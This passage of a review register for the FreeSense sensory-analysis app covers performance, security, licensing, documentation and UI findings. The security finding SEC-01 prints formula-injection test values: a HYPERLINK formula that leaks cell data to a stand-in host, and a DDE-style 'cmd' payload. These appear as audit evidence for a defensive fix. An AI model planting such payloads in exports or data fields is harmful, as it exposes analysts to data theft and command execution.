- **Register status: final severity MEDIUM (HIGH if hosted). Not challenged (MEDIUM/LOW).** (source: `B06-performance.md`)
- Severity: MEDIUM (HIGH if the app is hosted for more than a handful of concurrent users; LOW for local single-user installs)
- Confidence: VERIFIED for the measurements; the extrapolation to N users is Inferred
- Location: `.streamlit/config.toml` (no `server.maxUploadSize`, so Streamlit's default of 200 MB applies, per the orientation note); `core/data.py:8-37` (`load_data`, `max_entries=4`); `max_entries=8` on each stats cache; no row, attribute or product caps anywhere in Step 1 validation.
- Evidence:
  - GIL (`gil.py`): `sys._is_gil_enabled()` is True on this Python 3.14 build. Four `run_da_anova` calls took 4.18 s one after another and 4.39 s in four threads (0.95x). The statsmodels, pingouin and scipy `nquad` work is Python-level and does not run in parallel. Streamlit runs every session as a thread in one process, so N users pressing Run together each wait about N times as long, and every other user's 0.05 to 0.25 s reruns slow down too.
  - Memory at realistic sizes is not the problem (`apptest_mem.py`). RSS was 262 MB after imports and 362 MB after one full DA session (Run plus every step). Six sessions in the same process reached 373 MB, about 2 MB per extra session. `st.session_state` after a DA run is 1.1 MB pickled, of which `da_df_long` is 0.76 MB.
  - Large uploads are the problem (`bigupload.py`). A 194 MB CSV (468,750 rows x 103 columns) parses in 1.7 s into a 429 MB frame, and RSS rises by 480 MB. `load_data` keeps up to 4 such frames in its cache (about 1.7 GB), and Streamlit also keeps the upload bytes per session. The upload is re-hashed on every rerun (0.37 s per interaction). Melting 10% of it gave a 1.06 GB long frame, so pressing Run on the full file needs about 10.6 GB for `df_long` alone, before the cached copy that `clean_and_structure_data` stores. I did not run the full melt, to protect the shared machine.
  - A 1,000-attribute DA file ran for 102 s; 10,000 attributes extrapolates to about 17 minutes.
  - B07 already measured a 0.3 MB xlsx that decompresses to 86 MB, taking 46 s and 475 MB in `load_data`. Referenced, not repeated.
  - Cache eviction: the stats caches hold 8 entries each for the whole process. With more than 8 active datasets, step-level results that are only cached and not stored in session state are evicted and recomputed on a later rerun. At realistic and stress sizes that means `compute_da_diagnostics` (0.8 to 27.6 s), `summarise_assessor_performance` (2.5 to 8.4 s), CVA, stability and contrast. Inferred from `max_entries=8` and the call sites at `modules/descriptive/workflow.py:2324, 1874`; not measured under real concurrency.
- Impact: one user with a large or decompression-bomb file can exhaust memory or CPU for everyone on a hosted instance, and a handful of simultaneous Tukey runs makes the whole app unresponsive. For a local single-user install this is mostly irrelevant.
- Recommendation:
  - Set `server.maxUploadSize` to something like 20 MB, since realistic sensory files are well under 1 MB.
  - Validate rows, attributes and products in Step 1 against documented limits (for example 100,000 long rows or 500 attributes), with a clear message.
  - For hosting: run several Streamlit replicas behind a sticky load balancer, or move Run pipelines into a process pool; size memory at roughly 400 MB per process plus the upload limit times 4 for the `load_data` cache.
  - Consider `max_entries` of 16 or more, or TTLs, once PERF-01 makes entries cheaper to verify.
- Effort: S (config and caps); L (process isolation)
- Dependencies: deployment decision (see below)

### PERF-05: Long runs cannot be cancelled, DA's progress display is fake, and touching a widget mid-run discards the run
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B06-performance.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (code reading for the status text); Inferred from Streamlit source (interrupt semantics, not reproduced in a live browser)
- Location: `modules/descriptive/workflow.py:377-393`; `modules/cata/ui.py:987-996`; `modules/fusion/workflow.py:1560-1597`; Streamlit `runtime/scriptrunner/script_runner.py:493-557`.
- Evidence:
  - DA writes all five progress lines ("Running mixed-effects ANOVA…", "Running post-hoc comparisons…", "Computing panel performance…", "Running multivariate analysis (PCA)…") before the single blocking `run_full_da_analysis` call. The user therefore sees every stage as "done" at once for the whole 13 to 190 s. The line about PCA is also wrong, since PCA is not computed in Run.
  - CATA sets "Step 2/3: frequency tests + CLD…" only after those tests have finished.
  - RATA's labels are sequential and accurate.
  - Fusion runs up to 10,000 permutations (about 70 to 120 s) under a bare `st.spinner("Fitting PLS model…")`.
  - There is no cancel control. Streamlit can only interrupt a script at a "yield point", which is any `st.*` call that enqueues a message (`_maybe_handle_execution_control_request`, `runner.fastReruns` default True). Inside a stats function such as the 30-attribute LMM loop there is none, so the Stop menu item and widget clicks wait for the current cached function to return.
  - The next yield point (the next cached function's spinner, or the next `st.write`) raises `RerunException`. Everything after it, including `st.session_state.update(results)` and `set_module_analysis_complete`, is skipped. The run is lost and the user must press Run again. Stages that finished are cached, so the second attempt is shorter.
- Impact: on 30 s to 3 min runs, users will click around, lose the run without explanation, and have no idea how long is left.
- Recommendation:
  - Replace the up-front `st.write` lines in DA with `status.update(label=...)` between the stages. That means inlining the stage calls from `run_full_da_analysis`, or giving it a progress callback.
  - For per-attribute loops (LMM, CLD, ICC), accept an optional `progress` callable, called outside the cached function or via `st.progress` in the handler.
  - Show the permutation count and an estimated duration next to the Fusion permutation input.
  - Say in the status label that interacting with the page cancels the run.
- Effort: M
- Dependencies: PERF-03 (shorter runs reduce the need)

### PERF-06: DA "Run" crashes for a single-attribute dataset
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B06-performance.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `stats/panel_performance.py:130-139` (`compute_discrimination`, `groupby('attribute').apply(_rank_column)`).
- Evidence: through the real app, 10 assessors x 5 products x 1 attribute x 2 sessions gave `exception: ['Cannot set a DataFrame with multiple columns to the single column score'] | complete: False` (`apptest_patho.py`). With one group, `groupby.apply` returns a wide frame rather than a Series. This is the same line that raises the pandas `FutureWarning` noted in orientation. RATA with one attribute works (`patho.py`).
- Impact: a single-attribute DA (for example a sweetness-only study, or a user who excludes all but one attribute) cannot be analysed at all.
- Recommendation: use `disc_df.groupby('attribute')['neg_log_p'].rank(pct=True)`, filled from `range_score` where `neg_log_p` is all NaN, instead of `apply`, and add an AppTest for one attribute. The 1-product case is correctly blocked in Step 1 ("At least 2 products are required") and 1 assessor completes with a clear status.
- Effort: S
- Dependencies: none

### SEC-01: Excel exports write any text beginning with "=" as a live formula (formula injection)
- **Register status: final severity MEDIUM (HIGH if hosted). Challenge: reproduced (pass B); downgraded HIGH to MEDIUM for local use; HIGH if hosted or fed third-party free text (D-02).** (source: `B07-security-privacy.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `utils/export.py`, every builder (`generate_excel_report` l.829ff, `generate_da_excel_report` l.631, `generate_liking_excel_report` l.1028 incl. `Demographics` and `Raw_Data`, `generate_fusion_excel_report` l.1664 `Raw_Data`, `generate_prefmap_excel_report`, `generate_cata_excel_report`); root cause is `DataFrame.to_excel(engine='openpyxl')`, which stores any `str` starting with `=` as a formula cell.
- Evidence: `formula_injection.py` (RATA run completes with no exception). Formula cells found per sheet: Results_Table 4, Descriptives_CLD 40, Means_Wide 4, TickingRate_Wide 4, TickingRatePerRep_Wide 4, LMM_ANOVA 2, PostHoc_Pairwise 170, CochransQ 2, Raw_Data 2320. Examples: `Results_Table!E1 = '=HYPERLINK("http://example.invalid/?leak="&A2,"Click")'`, `Means_Wide!C1 = "=cmd|' /C calc'!A0"`, `Descriptives_CLD!B2 = '=2*21'`. Values beginning `@`, `+`, `-` were written as plain strings (openpyxl only treats `=` as a formula), so the xlsx risk is confined to `=`. Output saved as `rata_evil_export.xlsx`.
- Impact: product codes, attribute names, consumer IDs and especially free-text demographic answers (Liking demographics file, respondent-typed) are copied verbatim into the workbook. A respondent or a third-party questionnaire export can plant `=HYPERLINK(...)`/`=WEBSERVICE(...)` that sends neighbouring cells (other panellists' data) to an external URL when the analyst opens and clicks or recalculates, or DDE-style payloads on older Excel. Even benign data with a leading `=` (e.g. a product labelled `=A`) turns into a broken formula, so the export shows errors instead of the label. Excel's Protected View reduces but does not remove the risk once the analyst enables editing.
- Recommendation: add a final sweep next to `_format_p_value_cells` (it already visits every cell of every sheet as the last act of every builder) that, for every cell with `data_type == 'f'`, restores it as a string (`cell.value = str(v); cell.data_type = 's'`) or prefixes `'`. The app never writes a genuine formula, so the sweep can be unconditional. Pin it with a test using a `=` product name, as above.
- Effort: S
- Dependencies: none

### SEC-03: Local install listens on every network interface and phones checkip.amazonaws.com at start
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B07-security-privacy.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `.streamlit/config.toml` (`server.headless = true`, no `server.address`); Streamlit `web/bootstrap.py:297-325`, `net_util.py:24-55`.
- Evidence: `streamlit run app.py --server.port 8597` then `ss -ltn` shows `LISTEN 0 2048 *:8597`; the log prints `Network URL: http://10.2.0.2:8597` and `External URL: http://144.48.38.183:8597`. The external URL comes from `net_util.get_external_ip()`, an HTTP GET to `http://checkip.amazonaws.com` (HTTPS fallback), executed because `server.headless` is true and `server.address` is unset.
- Impact: a scientist running FreeSense on a laptop on office, university or conference Wi-Fi exposes the app to anyone on that network. Other visitors get their own session (they cannot read the owner's `session_state`), but they can use the server, and the app offers no authentication. The outbound call discloses the user's IP to AWS on every start, which contradicts the README-level impression that nothing leaves the machine (`browser.gatherUsageStats = false` is set, but this is a separate call).
- Recommendation: for the local-install distribution set `[server] address = "localhost"` in `.streamlit/config.toml` (this also takes the single-URL branch and skips the external-IP lookup). A hosted deployment overrides it in its own config.
- Effort: S
- Dependencies: D-B07-1

### SEC-05: No privacy or data-handling statement; personal data is held in shared server memory with no expiry
- **Register status: final severity MEDIUM (HIGH if hosted). Not challenged (MEDIUM/LOW).** (source: `B07-security-privacy.md`)
- Severity: MEDIUM (local); HIGH if hosted for third parties
- Confidence: VERIFIED
- Location: `README.md` and the About overlay (grep for privacy, personal data, GDPR, confidential: no hits in `README.md`, `CLAUDE.md`, `docs/*.md`); `core/data.py` and `stats/*` `@st.cache_data(max_entries=4|8)` with no `ttl`; export builders write `Raw_Data` (consumer/assessor IDs) and Liking `Demographics`.
- Evidence: Streamlit hashes an `UploadedFile` by its full bytes (`streamlit/runtime/caching/hashing.py:646-652`), so one session cannot receive another's cached result without already holding identical inputs: no cross-user leak via cache keys. But cache entries are process-global, have no TTL, and persist after the session closes until evicted by newer entries or restart. Nothing is written to disk by the app (orientation section 3; kaleido run added no files under `/tmp`).
- Impact: panellist IDs, consumer demographics and liking scores are personal data under the Australian Privacy Act and GDPR when they can identify someone. Locally, data never leaves the machine (apart from SEC-03), which is a selling point the app does not state. Hosted, the operator holds these data in RAM for an unbounded time, anyone with server access (logs, memory dumps) can reach them, and users are told nothing.
- Recommendation: add a short "Your data" section to the About page and README: where processing happens, that nothing is stored on disk, that data live only in server memory for the session plus cache, that exports contain raw IDs, and advise pseudonymised IDs. For a hosted build add `ttl=` (e.g. 1 hour) to every `cache_data` and consider `st.cache_data.clear()` on session end.
- Effort: S
- Dependencies: D-B07-1, D-B07-2

### REL-03: pingouin (GPL-3.0) is installed by default and imported by the MIT-licensed app; licence position undocumented
- **Register status: final severity MEDIUM. Challenge: reproduced (pass B, facts); downgraded to MEDIUM: licensing decision D-04, not a defect.** (source: `B08-packaging-licensing.md`)
- Severity: HIGH (licensing decision needed before release; not a technical defect)
- Confidence: VERIFIED (facts); the legal consequence is not a conclusion of this review
- Location: `requirements.txt:11` (`pingouin>=0.5.4,<1.0.0`, installed by default), `stats/panel_performance.py:21-25` (`try: import pingouin as pg`), used only at `stats/panel_performance.py:252-264` (`pg.intraclass_corr(...)` for the ICC3 95% CI columns `ICC_lower_approx`/`ICC_upper_approx`); README "License" section (`README.md:429-452`) mentions only the GPL datasets.
- Evidence: `importlib.metadata` reports `pingouin 0.6.1 | GPL-3.0`. It is the only copyleft package among ~65 installed distributions (others are MIT, BSD, Apache-2.0, PSF, MPL-2.0 for `certifi`; full list in the scratch output). pingouin also pulls seaborn, xarray, pandas-flavor, tabulate, which no FreeSense code imports. With pingouin uninstalled the app imports, the panel-performance and validation-pin tests pass (19 passed) and the DA AppTest file runs clean, so the "optional" claim in README line 72 holds.
- What this implies (common interpretation, not a legal conclusion):
  - **Source distribution (git clone + pip install):** FreeSense's own files do not contain pingouin code, and the user installs pingouin themselves from PyPI. The FSF's position is that a program that imports a GPL library and runs as one process forms a combined work that must be distributed under GPL-compatible terms as a whole; MIT *is* GPL-compatible, so MIT-licensed source that imports GPL-3.0 is generally considered fine to publish. The practical consequence is that anyone distributing the *combination* must honour GPL-3.0 for it, and the MIT grant does not let recipients close it. Many projects accept this; some institutions' policies do not.
  - **Hosted service (Streamlit Cloud, institutional server):** GPL-3.0 (unlike AGPL) is triggered by distribution, not by network use. Running FreeSense with pingouin for remote users is generally not "conveying" and imposes no source-offer obligation.
  - **Bundled binary (Docker image, PyInstaller, a university software share):** this *is* distribution of pingouin. The distributor must include the GPL-3.0 text, pingouin's source or a written offer for it, and must not impose terms that restrict the combined work beyond GPL-3.0. An MIT label on the image would be misleading about the combined work.
- Impact: users and institutions deciding whether they can adopt, redistribute or embed FreeSense cannot see from the README that a default install brings in a GPL-3.0 component. The feature it provides (approximate ICC CIs) is peripheral.
- Recommendation, options for the owner:
  1. **Replace with own code (preferred technically).** The ICC(3,1) CI is a closed-form F-based interval (Shrout and Fleiss 1979; McGraw and Wong 1996, Case 3): with `F0 = MS_between / MS_within`, `FL = F0 / F(1-a/2; df1, df2)`, `FU = F0 * F(1-a/2; df2, df1)`, `lower = (FL-1)/(FL+k-1)`, `upper = (FU-1)/(FU+k-1)`. The MS terms are already computed at `stats/panel_performance.py:218-221`; this is about ten lines with `scipy.stats.f` and would remove pingouin, seaborn, xarray and pandas-flavor from the dependency tree. It would also make the CI consistent with the unbalanced-aware OLS point estimate (pingouin's `intraclass_corr` works on a complete targets x raters table; see Leads). Validate against the frozen R ICC reference or `psych::ICC` numbers.
  2. **Make it truly optional:** move pingouin out of `requirements.txt` into e.g. `requirements-optional.txt` / a `[project.optional-dependencies] icc-ci` extra, and state its GPL-3.0 licence in README.
  3. **Keep as is and document:** add pingouin to the README licence section, and in any Docker/bundle ship the GPL-3.0 text and source offer.
  4. **Relicense FreeSense under GPL-3.0.** Removes the tension entirely, but closes off proprietary reuse by industry users.
- Effort: S (option 2 or 3), S to M (option 1 with a validation pin)
- Dependencies: decision D2

### REL-04: No lockfile; every fresh install resolves different versions, including release-candidate `wrapt`
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B08-packaging-licensing.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `requirements.txt` (ranges only); no lock/constraints file in the repo
- Evidence: a fresh install on the same Python on the same day as the project venv differed in four packages (step 2 above). `wrapt` resolves to a **pre-release** in both venvs (`2.4.2rc1` in `env/`, `2.5.0rc1` fresh) because `formulaic` (pulled in by statsmodels 0.15) declares `wrapt>=1.17.0rc1; python_version >= '3.13'`, and a pre-release in the specifier makes pip accept pre-releases. On Python 3.11 the resolver picks numpy 2.4.6 / scipy 1.17.1, versions the test suite has never run on. README (`README.md:35-41`) itself cites a past silent wrong-result incident caused by an unexpected build, which is exactly what a lock prevents.
- Impact: a user's results can come from a dependency set nobody tested; bug reports cannot be reproduced; a pre-release runtime library is installed silently.
- Recommendation: keep `requirements.txt` as the human-readable range file, and add a generated lock per supported Python (e.g. `pip-compile --generate-hashes` or `uv pip compile --python-version 3.1x`), referenced from README as the reproducible install. Optionally constrain `wrapt<2.5` or to a final release. Record the resolved versions (or `pip freeze` hash) in the `Run_Parameters` export next to `freesense_version`.
- Effort: S
- Dependencies: REL-06

### REL-05: Version string, tag and changelog disagree; `v1.0.0` tag is local only
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B08-packaging-licensing.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `core/__version__.py:1` (`1.0.0`), `utils/ui_shell.py:203` (sidebar caption), `utils/export.py:356` (every export's `Run_Parameters`), `README.md:3` and `:425` ("v1.0"/"Version 1.0"), `Statistical_Methods_README.md:4` ("Version: 1.0"), `CHANGELOG.md:8,201,286` (`[Unreleased]`, `[1.1.0] — Unreleased`, `[1.0.0] — Unreleased`)
- Evidence: `git tag -l` shows `v0.2.0` and `v1.0.0` (on `a4c3eb2`, 2026-05-18); `git rev-list --count v1.0.0..HEAD` = 146. Authenticated `git ls-remote origin` returns only `HEAD` and `refs/heads/main` -> **no tags have been pushed** (this corrects the orientation note, which said the tag is on the remote). No GitHub release is possible to confirm (repo private, `gh` not installed; unauthenticated API 404). Code that differs materially from `a4c3eb2` (Type II/LS-means changes, panel-performance fixes) still labels its exports `freesense_version = 1.0.0`, so two different computations are indistinguishable in an exported workbook.
- Impact: provenance of results is ambiguous; a user who reports "1.0.0" could mean either codebase.
- Recommendation: since nothing has been published, delete the local `v1.0.0` tag (or leave it and never push it) and cut the first public release from HEAD. Scheme: SemVer with the version in `core/__version__.py` only; collapse the three CHANGELOG headings into one dated `[1.0.0] - YYYY-MM-DD` (or `[0.9.0]` if beta modules ship, see D3) with the historical detail folded in; tag `vX.Y.Z` annotated on the release commit and push it; bump to `X.Y.(Z+1).dev0` after the tag so development builds never claim a release number. Optionally add the short git SHA to `Run_Parameters` for dev builds. Update the "v1.0"/"Version 1.0" strings in README and Statistical_Methods_README from the same source, or drop the version from those headers.
- Effort: S
- Dependencies: decision D3

### REL-06: Python support claim untested; `pyproject` ruff target contradicts the dependency floor; dev tools mixed into runtime requirements
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B08-packaging-licensing.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `README.md:35` ("Python 3.11–3.14"), `pyproject.toml:3` (`target-version = "py310"`), `requirements.txt:15-17` (`pytest`, `pytest-xdist` under "dev / test"), no CI (`.github/` absent)
- Evidence: py3.10 cannot install (numpy floor `>=2.3.2` has no 3.10 wheel, step 7). 3.11 installs from wheels on Linux, macOS arm64 and Windows, but with a different numpy/scipy set that has never been tested; this machine only has 3.14. pytest and pytest-xdist are installed into every user and Streamlit Cloud deployment. `ruff` is configured in `pyproject.toml` but not listed anywhere, and CLAUDE.md says "No linter is configured".
- Impact: the README claim is aspirational for 3.11 to 3.13. Users on 3.11/3.12 run an untested dependency set. Minor bloat on deployments.
- Recommendation: either narrow the claim to what is tested, or add a small CI matrix (3.11 and 3.14 on Linux, plus one Windows/macOS job) running `pytest` and `ruff`. Set `target-version = "py311"`. Split `requirements-dev.txt` (`-r requirements.txt`, pytest, pytest-xdist, ruff). Add `requires-python = ">=3.11"` if a `[project]` table is added (REL-07).
- Effort: S (split, target), M (CI)
- Dependencies: decision D4

### DOC-02: No ready-to-use methods text or per-module citation, and exports do not carry what a methods section needs
- **Register status: final severity MEDIUM. Challenge: partly reproduced (pass B): Fusion does write an Analysis_Info sheet; downgraded HIGH to MEDIUM.** (source: `B09-documentation.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `README.md:421-425` (Citation); `utils/export.py:334-560` (`build_run_parameters_sheet`); `Methods_Notes` writers at `utils/export.py:272` (RATA) and `2085` (CATA)
- Evidence: A grep of README and the methods reference for "cite", "methods section" and "reporting" finds only the single software citation "Danner, L. (2026). FreeSense ... (Version 1.0) [Software]", with no DOI, no `CITATION.cff` and no archived release. No module has a template paragraph (model, SS type, error term, post-hoc and correction family, software and version). A `Methods_Notes` sheet exists only for RATA and CATA. DA, Liking, Fusion and PrefMap have only `Run_Parameters`. `Run_Parameters` records `freesense_version` (`1.0.0`, which is also the tag on a commit 146 commits older, per 00-orientation flag 4) but no versions of statsmodels, scipy, scikit-learn or pingouin, which set the numerical engine.
- Impact: every user who publishes has to reverse-engineer a methods paragraph from a 257 KB developer-oriented document (and see DOC-01 for its errors). The recorded version string does not identify the code that ran, so a results table cannot be traced to a build.
- Recommendation: add a "How to report" block per module, both to the methods reference and as a `Methods_Notes` row in every export. It should be auto-filled from the run: model, SS type or LMM estimation method, error term actually used, post-hoc method and correction family, alpha, seeds and B, FreeSense version and git hash, and key dependency versions. Add a `CITATION.cff` and archive releases (for example with Zenodo) so the citation carries a DOI. Bump the version so the exported string identifies the build (see DOC-09).
- Effort: M
- Dependencies: Decisions D1 (version) and D3 (citation route).

### DOC-03: The interaction pre-test alpha is documented as not affecting product p-values; it does
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B09-documentation.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `Statistical_Methods_README.md:728`; `stats/da_anova.py:135-141` (docstring of `run_da_anova`)
- Evidence: both say the alpha_interaction threshold "does not affect the product p-values reported" or "Has no effect on the reported product p-values". The code (`stats/da_anova.py:353`, `int_sig = p_int < alpha_interaction`) uses it to pick the product F denominator. Run of `da_alpha.py` on sensochoc: with alpha_interaction 0.10 vs 0.0001, 8 of 14 attributes change p_product. For example, MilkF goes from 3.74e-40 (tested against Interaction) to 2.39e-51 (Residual), and Melting from 4.58e-12 to 5.24e-20. The in-app help (`modules/descriptive/workflow.py:242-249`) describes the behaviour correctly. The `run_da_anova` docstring also omits the `empty_cells` and `ss_type` columns it now returns.
- Impact: a user or reviewer who believes the setting is cosmetic may change it freely or fail to report it, although it changes the reported p-values and significance calls.
- Recommendation: replace the sentence in both places with "it selects the error term for the Product (and Assessor) F-test and therefore changes those p-values; it is recorded in Run_Parameters as alpha_interaction". Update the docstring's column list.
- Effort: S
- Dependencies: none

### DOC-04: README user guide is out of date with the code in several module sections
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B09-documentation.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `README.md` lines 136-157, 198, 207, 243, 263, 275, 283, 308, 368, 398
- Evidence:
  - Line 207 says the DA post-hoc default is Tukey-Kramer HSD. The default is FDR: `_DA_POSTHOC_OPTIONS = ["FDR (Benjamini-Hochberg)", "Tukey-Kramer HSD", ...]` with `index=0` (`modules/descriptive/workflow.py:231-236, 2496`).
  - Line 275 (and 368, 398) says the JAR penalty correction is configurable to Holm, Bonferroni, Sidak or BY "via the radio". `modules/liking/workflow.py:2596-2597` says "(not user-configurable)" and sets `correction_method = 'fdr_bh'`.
  - Line 263 says Liking Step 3 is a "two-way ANOVA (Type III SS ...)". Methods §24a and `stats/liking.py:952` are a mixed model with Wald chi-square tests (the OLS version was replaced, "review issue A1").
  - Line 154 (the orientation lead) says the CATA penalty caveat is "rendered as `st.caption` under every significant row". The code renders one caption that lists the significant attributes (`modules/cata/ui.py:2980-2990`), as CLAUDE.md states.
  - Line 142 says a banner warns when "more than 20%" of consumer blocks are dropped. `stats/shared/frequency.py:144-148` adds `q_warning` whenever `n_dropped > 0`, and the UI shows every warning (`modules/cata/ui.py:1330-1333`). The code is stricter than documented, and there is no 20% threshold.
  - Line 308 sends users to "Statistical Methods README §32 caveat" for the Q² CI. §32 is Autoscaling; the caveat is in §39 (line 2250).
  - Export sheet inventories: DA (line 243) says 14 or 15 sheets. The test pins 16 (`tests/test_export_rata.py:129-135`, including `Perf_Panel` and `Perf_Training`), or 17 with Contrast. RATA (line 198) says "12-sheet", but `TickingRatePerRep_Wide` is conditional (`utils/export.py:958`). CATA (line 157) omits `CLD_Summary` (`utils/export.py:2440`). Liking (line 283) omits `JAR_Distribution` (`utils/export.py:1447`).
  - Line 380 describes `utils/module_theme.py` as "per-module accent colours (RATA teal, ...)"; `utils/docs.py` is missing from the structure tree.
- Impact: users set up and interpret analyses from this page (it is also the in-app About page). A wrong default (DA post-hoc) and a non-existent option (JAR correction) directly mislead what gets reported.
- Recommendation: correct each line above. Generate the export sheet lists from the builders (or drop the counts) so they cannot drift.
- Effort: S
- Dependencies: none

### DOC-05: In-app help text mislabels the DA model and misdescribes the post-hoc options
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B09-documentation.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `modules/rata/ui.py:188-193`; `modules/descriptive/workflow.py:5, 199-208, 389, 755, 758-762, 791, 814, 1185`; `utils/ui_shell.py:72-74`
- Evidence:
  - The RATA and DA "Transparency note" captions say "FDR (Benjamini-Hochberg) is the most lenient and is the recommended default". Fisher LSD, which is also offered and is uncorrected, is more lenient than BH. The same captions call Tukey "the most conservative".
  - The DA model is labelled "mixed-effects ANOVA" or "Two-way mixed ANOVA" on the landing card and badge, the Step 2 banner, the "How to interpret" text, the results expander title and the run status text (line 389, the orientation lead). It is a fixed-effects OLS with Type III SS and a conditional error-term rule (`stats/da_anova.py:224-228, 292-298, 353`). Methods §15 explains the framing, but the UI labels alone would lead a user to write "mixed-effects model" in a paper. That implies a REML/lmer fit, which a mixed model would not make conditional in this way.
  - The Step 2 caption (line 759) says "a conditional F-test on the assessor term". The conditional rule selects the denominator of the Product (and Assessor) tests based on the interaction pre-test.
  - Line 1185 carries a stale inline comment, "model is mixed ANOVA (pingouin)"; the ANOVA does not use pingouin.
  - Minor, UX: the Step 1 run `st.status` writes all five progress lines (lines 386-391) before `run_full_da_analysis` is called, so the "Running ..." lines do not reflect progress.
- Impact: users choosing a post-hoc method are told the wrong ordering of leniency. The model name shown everywhere in the UI does not match what is computed, and that name is what users will report.
- Recommendation: rename to "Two-way ANOVA (OLS, Type III) with conditional error term" or "ANOVA with assessor as block", with one line pointing to §15 for the mixed-model rationale. Rewrite the correction caption as "LSD: no correction (most liberal); BH-FDR: controls FDR within attribute; Tukey: controls FWER within attribute (most conservative)". Fix the Step 2 caption. Emit the status lines between the actual pipeline stages.
- Effort: S
- Dependencies: none

### DOC-06: Data-format documentation does not let a new user format every module's file, and two shipped examples do not load where the docs say they should
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B09-documentation.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `README.md:78-93, 103-112, 320`; `example_data/README.md` (04_JAR and 05_Fusion_PrefMap sections); `modules/prefmap/workflow.py:548-600`; `modules/liking/workflow.py:571-640`
- Evidence:
  - README "Data Format" describes only the wide assessor x product x attributes layout, with one RATA/DA-style example. It does not describe:
    - Liking's single-liking-column long layout (README line 80 groups Liking under "wide format");
    - JAR coding (integers 1..k, with the middle code as JAR, and 3, 5 or 7 points; `modules/liking/workflow.py:579-583, 634-640`);
    - the demographics/secondary file keyed by consumer;
    - CATA's companion liking file;
    - PrefMap's three consumer inputs (Liking session, uploaded PC1/PC2 vectors, raw liking wide).

    In-app, every uploader shows an example table (10 `example_table=` sites), so the app itself is better than the README.
  - `Cocktail_consumer_liking.xlsx` is documented as "the consumer block for PrefMap" (example_data/README), and README line 320 says the PrefMap liking source is a "wide table: rows = products, columns = consumers". The file is long (`consumer, product, liking`; 1600 x 3, checked with pandas). PrefMap's raw-liking path treats every numeric non-product column as a consumer and rejects fewer than 5 (`modules/prefmap/workflow.py:590-600`). So the shipped example produces an error on the path the docs send the user to.
  - `JAR_sensominer.xlsx` holds French text levels (for example `sucre_pasassez`, `jar`), so JAR auto-detection (integer columns with 7 or fewer levels) never offers it. example_data/README says so, but adds that FreeSense "expects a numeric 5-point scale with a `_jar` suffix". No suffix rule exists in the code, and 3, 5 and 7 points are supported. As a result, no shipped dataset exercises the JAR penalty in the app.
- Impact: new users trying the documented example files for PrefMap and JAR hit errors or empty steps. Users formatting their own Liking/JAR/demographics files must rely on the in-app hints.
- Recommendation: add a per-module "File format" subsection to README (one small table each, including JAR coding and the demographics key). Ship a wide products x consumers version of the cocktail liking (or let PrefMap pivot a long file) and a numerically recoded JAR example. Correct the `_jar` suffix sentence.
- Effort: M
- Dependencies: B03 (upload/data handling) if the PrefMap loader is changed.

### UI-01: Opening About or the methods reference silently resets the colour scheme and export format
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `utils/ui_shell.py:210-259` (`render_sidebar` returns early while an overlay is open) and `:354-418` (`_render_settings`: `st.selectbox(..., index=0, key="colour_palette_selector")` without `persist_state`; `st.session_state["global_colour_palette"] = ...` is written unconditionally from the widget value)
- Evidence: `palette_persist.py` sets the palette to "Colour-blind safe" and the format to PNG, then opens About and presses Back. Output: `before colourblind png` / `about open; selector present? False` / `after back default svg Default`. The methods overlay does the same (`after methods default`). While an overlay is open the settings widgets are not rendered, so Streamlit drops their state. On return they come back at `index=0`, and that value is copied into `global_colour_palette` and `export_format`.
- Impact: A colour-blind user who picked the safe palette loses it without any message just by reading About or the methods reference. Charts that read the palette live (liking ramps, preference surface, cluster colours) switch back to red/green. On steps 2 and later, the "Colour scheme changed, re-run analysis" warning also appears (`render_step_header`) even though the user changed nothing. Chart downloads switch back to SVG.
- Recommendation: Give both widgets `persist_state="session"`, as CLAUDE.md requires for widgets that must survive un-rendering. Alternatively, keep rendering the settings expander in the overlay sidebar. Add an AppTest for this round trip next to the one in `tests/test_apptest_shell.py`.
- Effort: S
- Dependencies: none

### UI-02: Significant rows in the Liking penalty table are near-invisible on the dark theme, and greyed rows fail contrast on light
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B10-interface-accessibility.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (code path and frontend rule); rendering not observed in a browser
- Location: `modules/liking/workflow.py:84` (`FLAGGED_ROW_BG = "#ffe0e0"`), `:2878-2886` (`_style_row`: `background-color` only; untestable rows `color: #9e9e9e`)
